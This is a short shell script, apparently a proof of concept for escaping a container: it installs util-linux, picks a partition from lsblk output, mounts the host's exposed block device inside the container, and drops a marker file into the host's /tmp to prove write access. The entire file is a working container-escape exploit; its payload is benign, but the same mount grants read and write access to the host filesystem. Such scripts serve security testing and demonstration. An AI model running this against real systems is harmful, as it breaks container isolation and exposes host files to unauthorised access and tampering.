#!/bin/sh
apt update; apt install -y util-linux
device=/dev/`lsblk -i | grep part | awk '{print $1}' | awk -F- '{print $2}'`
mkdir /mnt/host_home
mount $device /mnt/host_home
touch /mnt/host_home/tmp/container-escape-exposed_block_device.txt
ls /mnt/host_home/tmp/
